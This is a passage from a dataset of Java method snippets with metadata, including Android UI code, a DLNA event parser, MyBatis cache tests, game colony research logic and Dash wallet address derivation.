"throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRimColor(int rimColor) {\n        this.mRimColor = rimColor;\n        setupPaints();\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58787, "method_name": "getSpinSpeed", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getSpinSpeed() {\n        return mSpinSpeed / 360.0f;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58788, "method_name": "setSpinSpeed", "class_name": "ProgressView", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSpinSpeed(float spinSpeed) {\n        this.mSpinSpeed = spinSpeed * 360.0f;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58789, "method_name": "getRimWidth", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRimWidth() {\n        return mRimWidth;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58790, "method_name": "setRimWidth", "class_name": "ProgressView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRimWidth(int rimWidth) {\n        this.mRimWidth = rimWidth;\n        if (!isSpinning) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 58791, "method_name": "writeToParcel", "class_name": "WheelSavedState", "params": ["Parcel", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void writeToParcel(Parcel out, int flags) {\n            super.writeToParcel(out, flags);\n            out.writeFloat(this.mProgress);\n            out.writeFloat(this.mTargetProgress);\n            out.writeByte((byte) (isSpinning ? 1 : 0));\n            out.writeFloat(this.spinSpeed);\n            out.writeInt(this.barWidth);\n            out.writeInt(this.barColor);\n            out.writeInt(this.rimWidth);\n            out.writeInt(this.rimColor);\n            out.writeInt(this.circleRadius);\n            out.writeByte((byte) (linearProgress ? 1 : 0));\n            out.writeByte((byte) (fillRadius ? 1 : 0));\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "BaseSavedState", "implements": null, "modifiers": ["static"]}}, {"id": 58792, "method_name": "health", "class_name": "ExampleHealthIndicator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Health", "snippet": "\tpublic Health health() {\n\t\treturn Health.up().withDetail(\"counter\", 42).build();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/main/java/smoketest/actuator/ExampleHealthIndicator.java", "stars": "47572", "class_props": {"extends": null, "implements": ["HealthIndicator"], "modifiers": ["public"]}}, {"id": 58793, "method_name": "getMax", "class_name": "Code08_GetMax", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int getMax(int[] arr) {\n\t\treturn process(arr, 0, arr.length - 1);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class02/Code08_GetMax.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58794, "method_name": "process", "class_name": "Code08_GetMax", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int process(int[] arr, int L, int R) {\n\t\tif (L == R) { // arr[L..R]\u8303\u56f4\u4e0a\u53ea\u6709\u4e00\u4e2a\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\uff0cbase case\n\t\t\treturn arr[L];\n\t\t}\n\t\tint mid = L + ((R - L) >> 1); // \u4e2d\u70b9   \t1\n\t\tint leftMax = process(arr, L, mid);\n\t\tint rightMax = process(arr, mid + 1, R);\n\t\treturn Math.max(leftMax, rightMax);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class02/Code08_GetMax.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58795, "method_name": "describeContents", "class_name": "APIVpnProfile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int describeContents() {\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/ht/vpn/android/api/APIVpnProfile.java", "stars": "4", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 58796, "method_name": "writeToParcel", "class_name": "APIVpnProfile", "params": ["Parcel", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeToParcel(Parcel dest, int flags) {\n        dest.writeString(mUUID);\n        dest.writeString(mName);\n        if (mUserEditable)\n            dest.writeInt(0);\n        else\n            dest.writeInt(1);\n        //dest.writeString(mProfileCreator);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/ht/vpn/android/api/APIVpnProfile.java", "stars": "4", "class_props": {"extends": null, "implements": ["Parcelable"], "modifiers": ["public"]}}, {"id": 58797, "method_name": "getCurrentMediaProviderType", "class_name": "ProviderManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCurrentMediaProviderType() {\n        return currentProviderType;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58798, "method_name": "getCurrentMediaProvider", "class_name": "ProviderManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaProvider", "snippet": "    public MediaProvider getCurrentMediaProvider() {\n        return getMediaProvider(getCurrentMediaProviderType());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58799, "method_name": "setCurrentProviderType", "class_name": "ProviderManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentProviderType(@ProviderType int providerType) {\n        if (getMediaProvider(providerType) != null) {\n            if (this.currentProviderType != providerType) {\n                this.currentProviderType = providerType;\n                if (listeners.size() > 0) {\n                    for (OnProviderChangeListener listener : listeners) {\n                        listener.onProviderChanged(providerType);\n                    }\n                }\n            }\n        } else {\n            throw new IllegalStateException(\"Provider for type no provided\");\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58800, "method_name": "getMediaProvider", "class_name": "ProviderManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "MediaProvider", "snippet": "    public MediaProvider getMediaProvider(@ProviderType int providerType) {\n        switch (providerType){\n            case PROVIDER_TYPE_ANIME:\n                return animeProvider;\n            case PROVIDER_TYPE_MOVIE:\n                return movieProvider;\n            case PROVIDER_TYPE_SHOW:\n                return showProvider;\n            default:\n                return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58801, "method_name": "hasProvider", "class_name": "ProviderManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasProvider(@ProviderType int providerType) {\n        return getMediaProvider(providerType) != null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58802, "method_name": "addProviderListener", "class_name": "ProviderManager", "params": ["OnProviderChangeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addProviderListener(@NonNull OnProviderChangeListener listener) {\n        //noinspection ConstantConditions\n        if (listener != null && !listeners.contains(listener)) {\n            listeners.add(listener);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58803, "method_name": "removeProviderListener", "class_name": "ProviderManager", "params": ["OnProviderChangeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeProviderListener(@NonNull OnProviderChangeListener listener) {\n        if (listener != null && listeners.size() > 0) {\n            listeners.remove(listener);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58804, "method_name": "getCurrentSubsProvider", "class_name": "ProviderManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SubsProvider", "snippet": "    public SubsProvider getCurrentSubsProvider() {\n        return getCurrentMediaProvider().getSubsProvider();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58805, "method_name": "hasCurrentSubsProvider", "class_name": "ProviderManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasCurrentSubsProvider() {\n        return getCurrentMediaProvider().hasSubsProvider();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/manager/provider/ProviderManager.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58806, "method_name": "main", "class_name": "Day5PostMan", "params": ["String"], "throws": ["MalformedURLException", "InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws MalformedURLException, InterruptedException {\n\n//\t\t1) Open Postman desktop application using Selenium\n\t\tDesktopOptions option = new DesktopOptions();\n\t\t \n\t\toption.setApplicationPath(\"C:\\\\Users\\\\hp\\\\AppData\\\\Local\\\\Postman\\\\Postman.exe\");\n\t\t \n\t\tWiniumDriver driver = new WiniumDriver(new URL(\"http://localhost:9999\"), option);\n\t\t\n\n//\t\t2) Create New Collection as RestLearning\n\t\tThread.sleep(5000);\n//\t\tdriver.findElementByClassName(\"Chrome_RenderWidgetHostHWND\").click();\n\t\tdriver.findElementByXPath(\"//div[@class=\\\"btn btn-primary\\\"]\").click();\n//\t\t3) Check whether the collection already exist\n//\t\t4) If exist, delete the existing Collection\n//\t\t5) Create new Collection\n\t}", "url": "https://raw.githubusercontent.com/msankrish92/SeleniumRealTimeAppTestCases/master/src/main/java/testCases/Day5PostMan.java", "stars": "19", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58807, "method_name": "parse", "class_name": "DLNAEventParser", "params": ["InputStream"], "throws": ["XmlPullParserException", "IOException", "JSONException"], "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject parse(InputStream in) throws XmlPullParserException, IOException, JSONException {\n        try {\n            XmlPullParser parser = Xml.newPullParser();\n            parser.setFeature(XmlPullParser.FEATURE_PROCESS_NAMESPACES, false);\n            parser.setInput(in, null);\n            parser.nextTag();\n            return readEvent(parser);\n        } finally {\n            in.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58808, "method_name": "readEvent", "class_name": "DLNAEventParser", "params": ["XmlPullParser"], "throws": ["IOException", "XmlPullParserException", "JSONException"], "modifiers": ["private"], "return_type": "JSONObject", "snippet": "    private JSONObject readEvent(XmlPullParser parser) throws IOException, XmlPullParserException, JSONException {\n        JSONObject event = new JSONObject();\n\n        JSONArray instanceIDs = new JSONArray();\n        JSONArray queueIDs = new JSONArray();\n\n        parser.require(XmlPullParser.START_TAG, ns, \"Event\");\n        while (parser.next() != XmlPullParser.END_TAG) {\n            if (parser.getEventType() != XmlPullParser.START_TAG) {\n                continue;\n            }\n            String name = parser.getName();\n            if (name.equals(\"InstanceID\")) {\n                instanceIDs.put(readInstanceID(parser));\n            }\n            else if (name.equals(\"QueueID\")) {\n                queueIDs.put(readQueueID(parser));\n            }\n            else {\n                skip(parser);\n            }\n        }\n\n        if (instanceIDs.length() > 0)\n            event.put(\"InstanceID\", instanceIDs);\n        if (queueIDs.length() > 0)\n            event.put(\"QueueID\", queueIDs);\n\n        return event;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58809, "method_name": "readInstanceID", "class_name": "DLNAEventParser", "params": ["XmlPullParser"], "throws": ["IOException", "XmlPullParserException", "JSONException"], "modifiers": ["private"], "return_type": "JSONArray", "snippet": "    private JSONArray readInstanceID(XmlPullParser parser) throws IOException, XmlPullParserException, JSONException {\n        JSONArray instanceIDs = new JSONArray();\n        JSONObject data = new JSONObject();\n\n        parser.require(XmlPullParser.START_TAG, ns, \"InstanceID\");\n        data.put(\"value\", parser.getAttributeValue(null, \"val\"));\n        instanceIDs.put(data);\n\n        while (parser.next() != XmlPullParser.END_TAG) {\n            if (parser.getEventType() != XmlPullParser.START_TAG) {\n                continue;\n            }\n            String name = parser.getName();\n            instanceIDs.put(readEntry(name, parser));\n        }\n\n        return instanceIDs;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58810, "method_name": "readQueueID", "class_name": "DLNAEventParser", "params": ["XmlPullParser"], "throws": ["IOException", "XmlPullParserException", "JSONException"], "modifiers": ["private"], "return_type": "JSONArray", "snippet": "    private JSONArray readQueueID(XmlPullParser parser) throws IOException, XmlPullParserException, JSONException {\n        JSONArray queueIDs = new JSONArray();\n        JSONObject data = new JSONObject();\n\n        parser.require(XmlPullParser.START_TAG, ns, \"QueueID\");\n        data.put(\"value\", parser.getAttributeValue(null, \"val\"));\n        queueIDs.put(data);\n\n        while (parser.next() != XmlPullParser.END_TAG) {\n            if (parser.getEventType() != XmlPullParser.START_TAG) {\n                continue;\n            }\n            String name = parser.getName();\n            queueIDs.put(readEntry(name, parser));\n        }\n\n        return queueIDs;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58811, "method_name": "readEntry", "class_name": "DLNAEventParser", "params": ["String", "XmlPullParser"], "throws": ["IOException", "XmlPullParserException", "JSONException"], "modifiers": ["private"], "return_type": "JSONObject", "snippet": "    private JSONObject readEntry(String target, XmlPullParser parser) throws IOException, XmlPullParserException, JSONException {\n        parser.require(XmlPullParser.START_TAG, ns, target);\n        String value = parser.getAttributeValue(null, \"val\");\n        String channel = parser.getAttributeValue(null, \"channel\");\n        parser.nextTag();\n        parser.require(XmlPullParser.END_TAG, ns, target);\n\n        JSONObject data = new JSONObject();\n        data.put(target, value);\n\n        if (channel!=null)\n            data.put(\"channel\", channel);\n\n        return data;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58812, "method_name": "skip", "class_name": "DLNAEventParser", "params": ["XmlPullParser"], "throws": ["XmlPullParserException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void skip(XmlPullParser parser) throws XmlPullParserException, IOException {\n        if (parser.getEventType() != XmlPullParser.START_TAG) {\n            throw new IllegalStateException();\n        }\n        int depth = 1;\n        while (depth != 0) {\n            switch (parser.next()) {\n            case XmlPullParser.END_TAG:\n                depth--;\n                break;\n            case XmlPullParser.START_TAG:\n                depth++;\n                break;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/upnp/DLNAEventParser.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58813, "method_name": "shouldDemonstrateHowAllObjectsAreKept", "class_name": "PerpetualCacheTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldDemonstrateHowAllObjectsAreKept() {\n    Cache cache = new PerpetualCache(\"default\");\n    cache = new SynchronizedCache(cache);\n    for (int i = 0; i < 100000; i++) {\n      cache.putObject(i, i);\n      assertEquals(i, cache.getObject(i));\n    }\n    assertEquals(100000, cache.getSize());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/PerpetualCacheTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58814, "method_name": "shouldDemonstrateCopiesAreEqual", "class_name": "PerpetualCacheTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldDemonstrateCopiesAreEqual() {\n    Cache cache = new PerpetualCache(\"default\");\n    cache = new SerializedCache(cache);\n    for (int i = 0; i < 1000; i++) {\n      cache.putObject(i, i);\n      assertEquals(i, cache.getObject(i));\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/PerpetualCacheTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58815, "method_name": "shouldRemoveItemOnDemand", "class_name": "PerpetualCacheTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldRemoveItemOnDemand() {\n    Cache cache = new PerpetualCache(\"default\");\n    cache = new SynchronizedCache(cache);\n    cache.putObject(0, 0);\n    assertNotNull(cache.getObject(0));\n    cache.removeObject(0);\n    assertNull(cache.getObject(0));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/PerpetualCacheTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58816, "method_name": "shouldFlushAllItemsOnDemand", "class_name": "PerpetualCacheTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldFlushAllItemsOnDemand() {\n    Cache cache = new PerpetualCache(\"default\");\n    cache = new SynchronizedCache(cache);\n    for (int i = 0; i < 5; i++) {\n      cache.putObject(i, i);\n    }\n    assertNotNull(cache.getObject(0));\n    assertNotNull(cache.getObject(4));\n    cache.clear();\n    assertNull(cache.getObject(0));\n    assertNull(cache.getObject(4));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/PerpetualCacheTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58817, "method_name": "log", "class_name": "Debug", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void log(Object out) {\n\t\tSystem.out.println(out);\n\t}", "url": "https://raw.githubusercontent.com/jabo-bernardo/Kree-Java/master/src/dev/jabo/kree/Debug.java", "stars": "33", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58818, "method_name": "main", "class_name": "AccountApp", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        SpringApplication.run(AccountApp.class,args);\n    }", "url": "https://raw.githubusercontent.com/yfelvis/mtcc/master/mtcc-demo/mtcc-demo-account/src/main/java/com/hyf/mtcc/demo/account/AccountApp.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58819, "method_name": "project", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ColonyResearchProject", "snippet": "    public ColonyResearchProject project()         { return project; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58820, "method_name": "hasProject", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasProject()                    { return project != null; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58821, "method_name": "project", "class_name": "ColonyResearch", "params": ["ColonyResearchProject"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void project(ColonyResearchProject p)   { project = p; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58822, "method_name": "endProject", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void endProject()                       { project = null; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58823, "method_name": "categoryType", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int categoryType()           { return Colony.RESEARCH; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58824, "method_name": "isCompleted", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isCompleted()        { return false; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58825, "method_name": "totalBC", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float totalBC()              { return totalSpending() * researchBonus(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58826, "method_name": "totalBCForEmpire", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float totalBCForEmpire()     { return max(0, totalBC() - projectRemainingBC()); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58827, "method_name": "totalSpending", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float totalSpending()        { return super.totalBC(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58828, "method_name": "projectRemainingBC", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float projectRemainingBC()   { return project == null ? 0 : project.remainingResearchBC(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58829, "method_name": "nextTurn", "class_name": "ColonyResearch", "params": ["float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void nextTurn(float totalProd, float totalReserve) {\n        projectBC = 0;\n        // there may be a special project at this colony that consumes research\n        if (project != null) {\n            projectBC = min(totalBC(), project.remainingResearchBC());\n            project.addResearchBC(projectBC);\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58830, "method_name": "researchBonus", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["private"], "return_type": "float", "snippet": "    private float researchBonus() { return  planet().researchAdj() * empire().race().researchBonusPct() * session().researchBonus(); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58831, "method_name": "warning", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean warning()      {        \n        return (project != null) && (totalBC() < project.remainingResearchBC()); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58832, "method_name": "upcomingResult", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String upcomingResult() {\n        if (colony().allocation(categoryType()) == 0)\n            return text(noneText);\n\n        float bc = totalBC();\n        if (project != null) {\n            bc -=  project.remainingResearchBC();\n            if (bc <= 0)\n                return text(project.projectKey());\n        }\n        return text(researchPointsText, (int)bc);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58833, "method_name": "assessTurn", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void assessTurn() { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58834, "method_name": "commitTurn", "class_name": "ColonyResearch", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void commitTurn() { }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/colony/ColonyResearch.java", "stars": "74", "class_props": {"extends": "ColonySpendingCategory", "implements": null, "modifiers": ["public"]}}, {"id": 58835, "method_name": "coinCode", "class_name": "Dash", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String coinCode() {\n        return Coins.DASH.coinCode();\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/DASH/Dash.java", "stars": "13", "class_props": {"extends": "Btc", "implements": null, "modifiers": ["public"]}}, {"id": 58836, "method_name": "parseInput", "class_name": "Tx", "params": [], "throws": ["JSONException", "InvalidTransactionException"], "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void parseInput() throws JSONException, InvalidTransactionException {\n            JSONArray inputs = metaData.getJSONArray(\"inputs\");\n            StringBuilder paths = new StringBuilder();\n            for (int i = 0; i < inputs.length(); i++) {\n                JSONObject input = inputs.getJSONObject(i);\n                String path = input.getString(\"ownerKeyPath\");\n                checkHdPath(path, false);\n                paths.append(path).append(SEPARATOR);\n                int index = input.optInt(\"index\");\n                if (index == 0) {\n                    input.put(\"index\", 0);\n                }\n                inputAmount += input.getLong(\"value\");\n            }\n            hdPath = paths.deleteCharAt(paths.length() - 1).toString();\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/DASH/Dash.java", "stars": "13", "class_props": {"extends": "Btc", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58837, "method_name": "derive", "class_name": "Deriver", "params": ["String", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String derive(String xPubKey, int changeIndex, int addrIndex) {\n            DeterministicKey address = getAddrDeterministicKey(xPubKey, changeIndex, addrIndex);\n            return Base58.encodeChecked(0x4c, address.getPubKeyHash());\n        }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/coins/DASH/Dash.java", "stars": "13", "class_props": {"extends": "AbsDeriver", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58838, "method_name": "derive", "class_name": "Deriver", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String derive(String xPubKey) 